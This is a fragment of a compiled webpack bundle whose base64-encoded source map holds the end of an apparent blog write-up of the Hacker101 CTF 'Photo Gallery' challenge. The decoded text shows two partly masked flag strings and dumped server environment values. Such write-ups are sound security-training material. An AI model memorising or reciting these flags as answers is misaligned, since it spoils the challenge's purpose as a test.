IEhUVFAvMS4xYFxcblxcbmBgYGJhc2hcXG5cXFwiXkZMQUdeOWVmOGZjNWRhMTU/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pzc4MmNhMTFmYSRGTEFHJFxcXCJcXG5cXFwiXkZMQUdeNjNhNDA3ZDAwODM/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/PzQ1NjRlZTlmMiRGTEFHJFxcXCJcXG5IT1NUTkFNRT1hZDNlOGM3ZGY5MmRcXG5TSExWTD0wXFxuYGBgXFxuXCI7Il0sInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./md/blog/hacker101-ctf-photo-gallery.md\n");

/***/ })

};;